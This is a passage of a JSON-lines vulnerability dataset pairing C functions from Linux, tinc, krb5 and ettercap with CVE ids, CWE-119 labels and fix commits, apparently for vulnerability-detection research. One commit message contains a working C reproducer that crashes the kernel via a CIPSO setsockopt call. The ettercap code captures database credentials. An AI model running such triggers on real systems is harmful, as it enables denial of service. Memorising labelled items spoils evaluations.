-ESHUTDOWN:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ESHUTDOWN\");\n\t\t\tgoto skip_error;\n\t\tcase -EPIPE:\n\t\t\tdev_err(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -EPIPE\\n\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tdev_err(&desc->intf->dev,\n\t\t\t\t\"Unexpected error %d\\n\", status);\n\t\t\tbreak;\n\t\t}\n \t}\n \n \tdesc->rerr = status;\n\tif (length + desc->length > desc->wMaxCommand) {\n\t\t/* The buffer would overflow */\n\t\tset_bit(WDM_OVERFLOW, &desc->flags);\n\t} else {\n\t\t/* we may already be in overflow */\n\t\tif (!test_bit(WDM_OVERFLOW, &desc->flags)) {\n\t\t\tmemmove(desc->ubuf + desc->length, desc->inbuf, length);\n\t\t\tdesc->length += length;\n\t\t\tdesc->reslength = length;\n\t\t}\n\t}\n skip_error:\n \twake_up(&desc->wait);\n \n\tset_bit(WDM_READ, &desc->flags);\n\tspin_unlock(&desc->iuspin);\n}\n", "func_hash": 232042914284621138013385320055714481189, "file_name": "cdc-wdm.c", "file_hash": 201237370339956394241335238293445181970, "cwe": ["CWE-119"], "cve": "CVE-2013-1860", "cve_desc": "Heap-based buffer overflow in the wdm_in_callback function in drivers/usb/class/cdc-wdm.c in the Linux kernel before 3.8.4 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted cdc-wdm USB device.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1860"}
{"idx": 158870, "project": "linux", "commit_id": "ce0030c00f95cf9110d9cdcd41e901e1fb814417", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/ce0030c00f95cf9110d9cdcd41e901e1fb814417", "commit_message": "None", "target": 0, "func": "static void call_console_drivers(unsigned start, unsigned end)\n{\n\tunsigned cur_index, start_print;\n\tstatic int msg_level = -1;\n\n\tBUG_ON(((int)(start - end)) > 0);\n\n\tcur_index = start;\n \tstart_print = start;\n \twhile (cur_index != end) {\n \t\tif (msg_level < 0 && ((end - cur_index) > 2)) {\n\t\t\t/*\n\t\t\t * prepare buf_prefix, as a contiguous array,\n\t\t\t * to be processed by log_prefix function\n\t\t\t */\n\t\t\tchar buf_prefix[SYSLOG_PRI_MAX_LENGTH+1];\n\t\t\tunsigned i;\n\t\t\tfor (i = 0; i < ((end - cur_index)) && (i < SYSLOG_PRI_MAX_LENGTH); i++) {\n\t\t\t\tbuf_prefix[i] = LOG_BUF(cur_index + i);\n\t\t\t}\n\t\t\tbuf_prefix[i] = '\\0'; /* force '\\0' as last string character */\n\n \t\t\t/* strip log prefix */\n\t\t\tcur_index += log_prefix((const char *)&buf_prefix, &msg_level, NULL);\n \t\t\tstart_print = cur_index;\n \t\t}\n \t\twhile (cur_index != end) {\n\t\t\tchar c = LOG_BUF(cur_index);\n\n\t\t\tcur_index++;\n\t\t\tif (c == '\\n') {\n\t\t\t\tif (msg_level < 0) {\n\t\t\t\t\t/*\n\t\t\t\t\t * printk() has already given us loglevel tags in\n\t\t\t\t\t * the buffer.  This code is here in case the\n\t\t\t\t\t * log buffer has wrapped right round and scribbled\n\t\t\t\t\t * on those tags\n\t\t\t\t\t */\n\t\t\t\t\tmsg_level = default_message_loglevel;\n\t\t\t\t}\n\t\t\t\t_call_console_drivers(start_print, cur_index, msg_level);\n\t\t\t\tmsg_level = -1;\n\t\t\t\tstart_print = cur_index;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t_call_console_drivers(start_print, end, msg_level);\n}\n", "func_hash": 278336960793883449565927929632836812543, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-1772", "cve_desc": "The log_prefix function in kernel/printk.c in the Linux kernel 3.x before 3.4.33 does not properly remove a prefix string from a syslog header, which allows local users to cause a denial of service (buffer overflow and system crash) by leveraging /dev/kmsg write access and triggering a call_console_drivers function call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1772"}
{"idx": 158871, "project": "tinc", "commit_id": "17a33dfd95b1a29e90db76414eb9622df9632320", "project_url": "https://github.com/gsliepen/tinc", "commit_url": "https://github.com/gsliepen/tinc/commit/17a33dfd95b1a29e90db76414eb9622df9632320", "commit_message": "Drop packets forwarded via TCP if they are too big (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they\ncannot be larger than the input buffer. However, when packets are forwarded via\nmeta connections, they are copied into a packet buffer without checking whether\nit fits into it. Since the packet buffer is allocated on the stack, this in\neffect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.", "target": 0, "func": " void receive_tcppacket(connection_t *c, const char *buffer, int len) {\n \tvpn_packet_t outpkt;\n \n\tif(len > sizeof outpkt.data)\n\t\treturn;\n\n \toutpkt.len = len;\n \tif(c->options & OPTION_TCPONLY)\n \t\toutpkt.priority = 0;\n\telse\n\t\toutpkt.priority = -1;\n\tmemcpy(outpkt.data, buffer, len);\n\n\treceive_packet(c->node, &outpkt);\n}\n", "func_hash": 237645872547157033698671999413216079111, "file_name": "net_packet.c", "file_hash": 84979222404728462495428936892737194515, "cwe": ["CWE-119"], "cve": "CVE-2013-1428", "cve_desc": "Stack-based buffer overflow in the receive_tcppacket function in net_packet.c in tinc before 1.0.21 and 1.1 before 1.1pre7 allows remote authenticated peers to cause a denial of service (crash) or possibly execute arbitrary code via a large TCP packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1428"}
{"idx": 158873, "project": "krb5", "commit_id": "8ee70ec63931d1e38567905387ab9b1d45734d81", "project_url": "https://github.com/krb5/krb5", "commit_url": "https://github.com/krb5/krb5/commit/8ee70ec63931d1e38567905387ab9b1d45734d81", "commit_message": "KDC TGS-REQ null deref [CVE-2013-1416]\n\nBy sending an unusual but valid TGS-REQ, an authenticated remote\nattacker can cause the KDC process to crash by dereferencing a null\npointer.\n\nprep_reprocess_req() can cause a null pointer dereference when\nprocessing a service principal name.  Code in this function can\ninappropriately pass a null pointer to strlcpy().  Unmodified client\nsoftware can trivially trigger this vulnerability, but the attacker\nmust have already authenticated and received a valid Kerberos ticket.\n\nThe vulnerable code was introduced by the implementation of new\nservice principal realm referral functionality in krb5-1.7, but was\ncorrected as a side effect of the KDC refactoring in krb5-1.11.\n\nCVSSv2 vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:H/RL:O/RC:C\n\nticket: 7600 (new)\nversion_fixed: 1.10.5\nstatus: resolved", "target": 0, "func": "prep_reprocess_req(krb5_kdc_req *request, krb5_principal *krbtgt_princ)\n{\n    krb5_error_code retval = KRB5KRB_AP_ERR_BADMATCH;\n    char **realms, **cpp, *temp_buf=NULL;\n    krb5_data *comp1 = NULL, *comp2 = NULL;\n    char *comp1_str = NULL;\n\n    /* By now we know that server principal name is unknown.\n     * If CANONICALIZE flag is set in the request\n     * If req is not U2U authn. req\n     * the requested server princ. has exactly two components\n     * either\n     *      the name type is NT-SRV-HST\n     *      or name type is NT-UNKNOWN and\n     *         the 1st component is listed in conf file under host_based_services\n     * the 1st component is not in a list in conf under \"no_host_referral\"\n     * the 2d component looks like fully-qualified domain name (FQDN)\n     * If all of these conditions are satisfied - try mapping the FQDN and\n     * re-process the request as if client had asked for cross-realm TGT.\n     */\n    if (isflagset(request->kdc_options, KDC_OPT_CANONICALIZE) &&\n        !isflagset(request->kdc_options, KDC_OPT_ENC_TKT_IN_SKEY) &&\n        krb5_princ_size(kdc_context, request->server) == 2) {\n\n        comp1 = krb5_princ_component(kdc_context, request->server, 0);\n        comp2 = krb5_princ_component(kdc_context, request->server, 1);\n\n        comp1_str = calloc(1,comp1->length+1);\n        if (!comp1_str) {\n             retval = ENOMEM;\n             goto cleanup;\n         }\n        if (comp1->data != NULL)\n            memcpy(comp1_str, comp1->data, comp1->length);\n \n         if ((krb5_princ_type(kdc_context, request->server) == KRB5_NT_SRV_HST ||\n              krb5_princ_type(kdc_context, request->server) == KRB5_NT_SRV_INST ||\n             (krb5_princ_type(kdc_context, request->server) == KRB5_NT_UNKNOWN &&\n              kdc_active_realm->realm_host_based_services != NULL &&\n              (krb5_match_config_pattern(kdc_active_realm->realm_host_based_services,\n                                         comp1_str) == TRUE ||\n               krb5_match_config_pattern(kdc_active_realm->realm_host_based_services,\n                                         KRB5_CONF_ASTERISK) == TRUE))) &&\n            (kdc_active_realm->realm_no_host_referral == NULL ||\n             (krb5_match_config_pattern(kdc_active_realm->realm_no_host_referral,\n                                        KRB5_CONF_ASTERISK) == FALSE &&\n              krb5_match_config_pattern(kdc_active_realm->realm_no_host_referral,\n                                        comp1_str) == FALSE))) {\n\n            if (memchr(comp2->data, '.', comp2->length) == NULL)\n                goto cleanup;\n            temp_buf = calloc(1, comp2->length+1);\n            if (!temp_buf) {\n                 retval = ENOMEM;\n                 goto cleanup;\n             }\n            if (comp2->data != NULL)\n                memcpy(temp_buf, comp2->data, comp2->length);\n             retval = krb5int_get_domain_realm_mapping(kdc_context, temp_buf, &realms);\n             free(temp_buf);\n             if (retval) {\n                /* no match found */\n                kdc_err(kdc_context, retval, \"unable to find realm of host\");\n                goto cleanup;\n            }\n            if (realms == 0) {\n                retval = KRB5KRB_AP_ERR_BADMATCH;\n                goto cleanup;\n            }\n            /* Don't return a referral to the null realm or the service\n             * realm. */\n            if (realms[0] == 0 ||\n                data_eq_string(request->server->realm, realms[0])) {\n                free(realms[0]);\n                free(realms);\n                retval = KRB5KRB_AP_ERR_BADMATCH;\n                goto cleanup;\n            }\n            /* Modify request.\n             * Construct cross-realm tgt :  krbtgt/REMOTE_REALM@LOCAL_REALM\n             * and use it as a principal in this req.\n             */\n            retval = krb5_build_principal(kdc_context, krbtgt_princ,\n                                          (*request->server).realm.length,\n                                          (*request->server).realm.data,\n                                          \"krbtgt\", realms[0], (char *)0);\n            for (cpp = realms; *cpp; cpp++)\n                free(*cpp);\n        }\n    }\ncleanup:\n    free(comp1_str);\n\n    return retval;\n}\n", "func_hash": 167732044059211621819547423315877020969, "file_name": "do_tgs_req.c", "file_hash": 69088724082177518861401437051756458447, "cwe": ["CWE-119"], "cve": "CVE-2013-1416", "cve_desc": "The prep_reprocess_req function in do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.5 does not properly perform service-principal realm referral, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted TGS-REQ request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1416"}
{"idx": 158880, "project": "linux", "commit_id": "89d7ae34cdda4195809a5a987f697a517a2a3177", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/89d7ae34cdda4195809a5a987f697a517a2a3177", "commit_message": "cipso: don't follow a NULL pointer when setsockopt() is called\n\nAs reported by Alan Cox, and verified by Lin Ming, when a user\nattempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL\ntag the kernel dies a terrible death when it attempts to follow a NULL\npointer (the skb argument to cipso_v4_validate() is NULL when called via\nthe setsockopt() syscall).\n\nThis patch fixes this by first checking to ensure that the skb is\nnon-NULL before using it to find the incoming network interface.  In\nthe unlikely case where the skb is NULL and the user attempts to add\na CIPSO option with the _TAG_LOCAL tag we return an error as this is\nnot something we want to allow.\n\nA simple reproducer, kindly supplied by Lin Ming, although you must\nhave the CIPSO DOI #3 configure on the system first or you will be\ncaught early in cipso_v4_validate():\n\n\t#include <sys/types.h>\n\t#include <sys/socket.h>\n\t#include <linux/ip.h>\n\t#include <linux/in.h>\n\t#include <string.h>\n\n\tstruct local_tag {\n\t\tchar type;\n\t\tchar length;\n\t\tchar info[4];\n\t};\n\n\tstruct cipso {\n\t\tchar type;\n\t\tchar length;\n\t\tchar doi[4];\n\t\tstruct local_tag local;\n\t};\n\n\tint main(int argc, char **argv)\n\t{\n\t\tint sockfd;\n\t\tstruct cipso cipso = {\n\t\t\t.type = IPOPT_CIPSO,\n\t\t\t.length = sizeof(struct cipso),\n\t\t\t.local = {\n\t\t\t\t.type = 128,\n\t\t\t\t.length = sizeof(struct local_tag),\n\t\t\t},\n\t\t};\n\n\t\tmemset(cipso.doi, 0, 4);\n\t\tcipso.doi[3] = 3;\n\n\t\tsockfd = socket(AF_INET, SOCK_DGRAM, 0);\n\t\t#define SOL_IP 0\n\t\tsetsockopt(sockfd, SOL_IP, IP_OPTIONS,\n\t\t\t&cipso, sizeof(struct cipso));\n\n\t\treturn 0;\n\t}\n\nCC: Lin Ming <mlin@ss.pku.edu.cn>\nReported-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: Paul Moore <pmoore@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "int cipso_v4_validate(const struct sk_buff *skb, unsigned char **option)\n{\n\tunsigned char *opt = *option;\n\tunsigned char *tag;\n\tunsigned char opt_iter;\n\tunsigned char err_offset = 0;\n\tu8 opt_len;\n\tu8 tag_len;\n\tstruct cipso_v4_doi *doi_def = NULL;\n\tu32 tag_iter;\n\n\t/* caller already checks for length values that are too large */\n\topt_len = opt[1];\n\tif (opt_len < 8) {\n\t\terr_offset = 1;\n\t\tgoto validate_return;\n\t}\n\n\trcu_read_lock();\n\tdoi_def = cipso_v4_doi_search(get_unaligned_be32(&opt[2]));\n\tif (doi_def == NULL) {\n\t\terr_offset = 2;\n\t\tgoto validate_return_locked;\n\t}\n\n\topt_iter = CIPSO_V4_HDR_LEN;\n\ttag = opt + opt_iter;\n\twhile (opt_iter < opt_len) {\n\t\tfor (tag_iter = 0; doi_def->tags[tag_iter] != tag[0];)\n\t\t\tif (doi_def->tags[tag_iter] == CIPSO_V4_TAG_INVALID ||\n\t\t\t    ++tag_iter == CIPSO_V4_TAG_MAXCNT) {\n\t\t\t\terr_offset = opt_iter;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\ttag_len = tag[1];\n\t\tif (tag_len > (opt_len - opt_iter)) {\n\t\t\terr_offset = opt_iter + 1;\n\t\t\tgoto validate_return_locked;\n\t\t}\n\n\t\tswitch (tag[0]) {\n\t\tcase CIPSO_V4_TAG_RBITMAP:\n\t\t\tif (tag_len < CIPSO_V4_TAG_RBM_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\t/* We are already going to do all the verification\n\t\t\t * necessary at the socket layer so from our point of\n\t\t\t * view it is safe to turn these checks off (and less\n\t\t\t * work), however, the CIPSO draft says we should do\n\t\t\t * all the CIPSO validations here but it doesn't\n\t\t\t * really specify _exactly_ what we need to validate\n\t\t\t * ... so, just make it a sysctl tunable. */\n\t\t\tif (cipso_v4_rbm_strictvalid) {\n\t\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\t\tgoto validate_return_locked;\n\t\t\t\t}\n\t\t\t\tif (tag_len > CIPSO_V4_TAG_RBM_BLEN &&\n\t\t\t\t    cipso_v4_map_cat_rbm_valid(doi_def,\n\t\t\t\t\t\t\t    &tag[4],\n\t\t\t\t\t\t\t    tag_len - 4) < 0) {\n\t\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\t\tgoto validate_return_locked;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CIPSO_V4_TAG_ENUM:\n\t\t\tif (tag_len < CIPSO_V4_TAG_ENUM_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tif (tag_len > CIPSO_V4_TAG_ENUM_BLEN &&\n\t\t\t    cipso_v4_map_cat_enum_valid(doi_def,\n\t\t\t\t\t\t\t&tag[4],\n\t\t\t\t\t\t\ttag_len - 4) < 0) {\n\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CIPSO_V4_TAG_RANGE:\n\t\t\tif (tag_len < CIPSO_V4_TAG_RNG_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tif (tag_len > CIPSO_V4_TAG_RNG_BLEN &&\n\t\t\t    cipso_v4_map_cat_rng_valid(doi_def,\n\t\t\t\t\t\t       &tag[4],\n\t\t\t\t\t\t       tag_len - 4) < 0) {\n\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n \t\tcase CIPSO_V4_TAG_LOCAL:\n \t\t\t/* This is a non-standard tag that we only allow for\n \t\t\t * local connections, so if the incoming interface is\n\t\t\t * not the loopback device drop the packet. Further,\n\t\t\t * there is no legitimate reason for setting this from\n\t\t\t * userspace so reject it if skb is NULL. */\n\t\t\tif (skb == NULL || !(skb->dev->flags & IFF_LOOPBACK)) {\n \t\t\t\terr_offset = opt_iter;\n \t\t\t\tgoto validate_return_locked;\n \t\t\t}\n\t\t\tif (tag_len != CIPSO_V4_TAG_LOC_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\terr_offset = opt_iter;\n\t\t\tgoto validate_return_locked;\n\t\t}\n\n\t\ttag += tag_len;\n\t\topt_iter += tag_len;\n\t}\n\nvalidate_return_locked:\n\trcu_read_unlock();\nvalidate_return:\n\t*option = opt + err_offset;\n\treturn err_offset;\n}\n", "func_hash": 203090929831454367454771625918575782687, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-0310", "cve_desc": "The cipso_v4_validate function in net/ipv4/cipso_ipv4.c in the Linux kernel before 3.4.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via an IPOPT_CIPSO IP_OPTIONS setsockopt system call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-0310"}
{"idx": 158928, "project": "linux", "commit_id": "b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c", "commit_message": "batman-adv: Only write requested number of byte to user buffer\n\nDon't write more than the requested number of bytes of an batman-adv icmp\npacket to the userspace buffer. Otherwise unrelated userspace memory might get\noverridden by the kernel.\n\nSigned-off-by: Sven Eckelmann <sven@narfation.org>\nSigned-off-by: Marek Lindner <lindner_marek@yahoo.de>", "target": 0, "func": "static ssize_t bat_socket_read(struct file *file, char __user *buf,\n\t\t\t       size_t count, loff_t *ppos)\n{\n\tstruct socket_client *socket_client = file->private_data;\n\tstruct socket_packet *socket_packet;\n\tsize_t packet_len;\n\tint error;\n\n\tif ((file->f_flags & O_NONBLOCK) && (socket_client->queue_len == 0))\n\t\treturn -EAGAIN;\n\n\tif ((!buf) || (count < sizeof(struct icmp_packet)))\n\t\treturn -EINVAL;\n\n\tif (!access_ok(VERIFY_WRITE, buf, count))\n\t\treturn -EFAULT;\n\n\terror = wait_event_interruptible(socket_client->queue_wait,\n\t\t\t\t\t socket_client->queue_len);\n\n\tif (error)\n\t\treturn error;\n\n\tspin_lock_bh(&socket_client->lock);\n\n\tsocket_packet = list_first_entry(&socket_client->queue_list,\n\t\t\t\t\t struct socket_packet, list);\n\tlist_del(&socket_packet->list);\n\tsocket_client->queue_len--;\n \n \tspin_unlock_bh(&socket_client->lock);\n \n\tpacket_len = min(count, socket_packet->icmp_len);\n\terror = copy_to_user(buf, &socket_packet->icmp_packet, packet_len);\n \n \tkfree(socket_packet);\n \n \tif (error)\n\t\treturn -EFAULT;\n\n\treturn packet_len;\n}\n", "func_hash": 146563344002856956202954325132007595650, "file_name": "icmp_socket.c", "file_hash": 218189560527124045193594164952594783984, "cwe": ["CWE-119"], "cve": "CVE-2011-4604", "cve_desc": "The bat_socket_read function in net/batman-adv/icmp_socket.c in the Linux kernel before 3.3 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted batman-adv ICMP packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4604"}
{"idx": 158952, "project": "linux", "commit_id": "d370af0ef7951188daeb15bae75db7ba57c67846", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d370af0ef7951188daeb15bae75db7ba57c67846", "commit_message": "irda: validate peer name and attribute lengths\n\nLength fields provided by a peer for names and attributes may be longer\nthan the destination array sizes.  Validate lengths to prevent stack\nbuffer overflows.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void iriap_getvaluebyclass_indication(struct iriap_cb *self,\n\t\t\t\t\t     struct sk_buff *skb)\n{\n\tstruct ias_object *obj;\n\tstruct ias_attrib *attrib;\n\tint name_len;\n\tint attr_len;\n\tchar name[IAS_MAX_CLASSNAME + 1];\t/* 60 bytes */\n\tchar attr[IAS_MAX_ATTRIBNAME + 1];\t/* 60 bytes */\n\t__u8 *fp;\n\tint n;\n\n\tIRDA_DEBUG(4, \"%s()\\n\", __func__);\n\n\tIRDA_ASSERT(self != NULL, return;);\n\tIRDA_ASSERT(self->magic == IAS_MAGIC, return;);\n\tIRDA_ASSERT(skb != NULL, return;);\n\n\tfp = skb->data;\n \tn = 1;\n \n \tname_len = fp[n++];\n\n\tIRDA_ASSERT(name_len < IAS_MAX_CLASSNAME + 1, return;);\n\n \tmemcpy(name, fp+n, name_len); n+=name_len;\n \tname[name_len] = '\\0';\n \n \tattr_len = fp[n++];\n\n\tIRDA_ASSERT(attr_len < IAS_MAX_ATTRIBNAME + 1, return;);\n\n \tmemcpy(attr, fp+n, attr_len); n+=attr_len;\n \tattr[attr_len] = '\\0';\n \n\tIRDA_DEBUG(4, \"LM-IAS: Looking up %s: %s\\n\", name, attr);\n\tobj = irias_find_object(name);\n\n\tif (obj == NULL) {\n\t\tIRDA_DEBUG(2, \"LM-IAS: Object %s not found\\n\", name);\n\t\tiriap_getvaluebyclass_response(self, 0x1235, IAS_CLASS_UNKNOWN,\n\t\t\t\t\t       &irias_missing);\n\t\treturn;\n\t}\n\tIRDA_DEBUG(4, \"LM-IAS: found %s, id=%d\\n\", obj->name, obj->id);\n\n\tattrib = irias_find_attrib(obj, attr);\n\tif (attrib == NULL) {\n\t\tIRDA_DEBUG(2, \"LM-IAS: Attribute %s not found\\n\", attr);\n\t\tiriap_getvaluebyclass_response(self, obj->id,\n\t\t\t\t\t       IAS_ATTRIB_UNKNOWN,\n\t\t\t\t\t       &irias_missing);\n\t\treturn;\n\t}\n\n\t/* We have a match; send the value.  */\n\tiriap_getvaluebyclass_response(self, obj->id, IAS_SUCCESS,\n\t\t\t\t       attrib->value);\n}\n", "func_hash": 188363666428243788930341938329751308181, "file_name": "iriap.c", "file_hash": 2768355254666252778479089663776274149, "cwe": ["CWE-119"], "cve": "CVE-2011-1180", "cve_desc": "Multiple stack-based buffer overflows in the iriap_getvaluebyclass_indication function in net/irda/iriap.c in the Linux kernel before 2.6.39 allow remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging connectivity to an IrDA infrared network and sending a large integer value for a (1) name length or (2) attribute length.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-1180"}
{"idx": 158959, "project": "linux", "commit_id": "f2e323ec96077642d397bb1c355def536d489d16", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/f2e323ec96077642d397bb1c355def536d489d16", "commit_message": "[media] ttusb-dec: buffer overflow in ioctl\n\nWe need to add a limit check here so we don't overflow the buffer.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>", "target": 0, "func": "static int ttusbdecfe_dvbs_diseqc_send_master_cmd(struct dvb_frontend* fe, struct dvb_diseqc_master_cmd *cmd)\n{\n\tstruct ttusbdecfe_state* state = (struct ttusbdecfe_state*) fe->demodulator_priv;\n\tu8 b[] = { 0x00, 0xff, 0x00, 0x00,\n \t\t   0x00, 0x00, 0x00, 0x00,\n \t\t   0x00, 0x00 };\n \n\tif (cmd->msg_len > sizeof(b) - 4)\n\t\treturn -EINVAL;\n\n \tmemcpy(&b[4], cmd->msg, cmd->msg_len);\n \n \tstate->config->send_command(fe, 0x72,\n\t\t\t\t    sizeof(b) - (6 - cmd->msg_len), b,\n\t\t\t\t    NULL, NULL);\n\n\treturn 0;\n}\n", "func_hash": 152213072998875333849754242091004095658, "file_name": "ttusbdecfe.c", "file_hash": 218785497703789925227719447415859611077, "cwe": ["CWE-119"], "cve": "CVE-2014-8884", "cve_desc": "Stack-based buffer overflow in the ttusbdecfe_dvbs_diseqc_send_master_cmd function in drivers/media/usb/ttusb-dec/ttusbdecfe.c in the Linux kernel before 3.17.4 allows local users to cause a denial of service (system crash) or possibly gain privileges via a large message length in an ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-8884"}
{"idx": 158978, "project": "ettercap", "commit_id": "e3abe7d7585ecc420a7cab73313216613aadad5a", "project_url": "https://github.com/Ettercap/ettercap", "commit_url": "https://github.com/Ettercap/ettercap/commit/e3abe7d7585ecc420a7cab73313216613aadad5a", "commit_message": "Fixed heap overflow caused by length", "target": 0, "func": "FUNC_DECODER(dissector_postgresql)\n{\n   DECLARE_DISP_PTR(ptr);\n   struct ec_session *s = NULL;\n   void *ident = NULL;\n   char tmp[MAX_ASCII_ADDR_LEN];\n   struct postgresql_status *conn_status;\n\n   /* don't complain about unused var */\n   (void) DECODE_DATA; \n   (void) DECODE_DATALEN;\n   (void) DECODED_LEN;\n   \n   if (FROM_CLIENT(\"postgresql\", PACKET)) {\n      if (PACKET->DATA.len < 4)\n         return NULL;\n\n      dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_postgresql));\n\n      /* if the session does not exist... */\n      if (session_get(&s, ident, DISSECT_IDENT_LEN) == -ENOTFOUND) {\n         /* search for user and database strings, look for StartupMessage  */\n         unsigned char *u = memmem(ptr, PACKET->DATA.len, \"user\", 4);\n         unsigned char *d = memmem(ptr, PACKET->DATA.len, \"database\", 8);\n         if (!memcmp(ptr + 4, \"\\x00\\x03\\x00\\x00\", 4) && u && d) {\n            /* create the new session */\n            dissect_create_session(&s, PACKET, DISSECT_CODE(dissector_postgresql));\n\n            /* remember the state (used later) */\n            SAFE_CALLOC(s->data, 1, sizeof(struct postgresql_status));\n\n            conn_status = (struct postgresql_status *) s->data;\n            conn_status->status = WAIT_AUTH;\n\n            /* user is always null-terminated */\n            strncpy((char*)conn_status->user, (char*)(u + 5), 65);\n            conn_status->user[64] = 0;\n\n            /* database is always null-terminated */\n            strncpy((char*)conn_status->database, (char*)(d + 9), 65);\n            conn_status->database[64] = 0;\n\n            /* save the session */\n            session_put(s);\n         }\n      } else {\n         conn_status = (struct postgresql_status *) s->data;\n         if (conn_status->status == WAIT_RESPONSE) {\n\n            /* check for PasswordMessage packet */\n            if (ptr[0] == 'p' && conn_status->type == MD5) {\n               DEBUG_MSG(\"\\tDissector_postgresql RESPONSE type is MD5\");\n               if(memcmp(ptr + 1, \"\\x00\\x00\\x00\\x28\", 4)) {\n                  DEBUG_MSG(\"\\tDissector_postgresql BUG, expected length is 40\");\n                  return NULL;\n               }\n               if (PACKET->DATA.len < 40) {\n                  DEBUG_MSG(\"\\tDissector_postgresql BUG, expected length is 40\");\n                  return NULL;\n               }\n               memcpy(conn_status->hash, ptr + 5 + 3, 32);\n               conn_status->hash[32] = 0;\n               DISSECT_MSG(\"%s:$postgres$%s*%s*%s:%s:%d\\n\", conn_status->user, conn_status->user, conn_status->salt, conn_status->hash, ip_addr_ntoa(&PACKET->L3.dst, tmp), ntohs(PACKET->L4.dst));\n               dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n            }\n            else if (ptr[0] == 'p' && conn_status->type == CT) {\n                int length;\n                DEBUG_MSG(\"\\tDissector_postgresql RESPONSE type is clear-text!\");\n                GET_ULONG_BE(length, ptr, 1);\n               length -= 4;\n               if (length < 0 || length > 65 || PACKET->DATA.len < length+5) {\n                   dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n                   return NULL;\n               }\n               snprintf((char*)conn_status->password, length+1, \"%s\", (char*)(ptr + 5));\n                DISSECT_MSG(\"PostgreSQL credentials:%s-%d:%s:%s\\n\", ip_addr_ntoa(&PACKET->L3.dst, tmp), ntohs(PACKET->L4.dst), conn_status->user, conn_status->password);\n                dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n             }\n         }\n      }\n   } else { /* Packets coming from the server */\n      if (PACKET->DATA.len < 9)\n         return NULL;\n      dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_postgresql));\n\n      if (session_get(&s, ident, DISSECT_IDENT_LEN) == ESUCCESS) {\n         conn_status = (struct postgresql_status *) s->data;\n         if (conn_status->status == WAIT_AUTH &&\n               ptr[0] == 'R' && !memcmp(ptr + 1, 